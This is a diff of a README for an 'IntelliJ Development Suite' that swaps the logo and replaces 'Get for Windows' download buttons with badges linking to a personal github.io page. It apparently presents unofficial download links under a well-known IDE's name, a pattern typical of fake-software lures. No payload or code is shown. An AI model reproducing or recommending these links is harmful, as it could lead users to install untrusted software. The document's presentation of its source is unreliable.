@@ -1,14 +1,12 @@
 # IntelliJ Development Suite
 
 <div align="center">
-<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/47/JetBrains_IntelliJ_IDEA_Product_Logo.svg/2560px-JetBrains_IntelliJ_IDEA_Product_Logo.svg.png" alt="IntelliJ Development Suite" width="900">
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSXZVcyv_gJTlmUcqpV_vv4O7tqRVF89gwnoOyYIZMfkIRvvc95kOSkUIM&s=10" alt="IntelliJ Development Suite" width="900">
 </div>
 <br>
 
-<div align="center">
+[![GET IntelliJ Development](https://img.shields.io/badge/GET%20%E2%80%94%20IntelliJ-Development-0078D6?style=for-the-badge&logoColor=white)](https://perra2000pantaleo.github.io/.github/IntelliJ-Development)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://intellij-development-suite.github.io/.github/)
-</div>
 
 ---
 
@@ -24,10 +22,8 @@ Web technology enhancements include comprehensive JavaScript and TypeScript supp
 <img src="https://origin2.cdn.componentsource.com/sites/default/files/styles/social/public/images/feature_release/2019/03/28/img_668771.png?itok=8l4wbhaE" width="auto">
 </div>
 
-<div align="center">
+[![GET IntelliJ Development](https://img.shields.io/badge/GET%20%E2%80%94%20IntelliJ-Development-0078D6?style=for-the-badge&logoColor=white)](https://perra2000pantaleo.github.io/.github/IntelliJ-Development)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://intellij-development-suite.github.io/.github/)
-</div>
 
 ---
 ### 🎛 Key Features
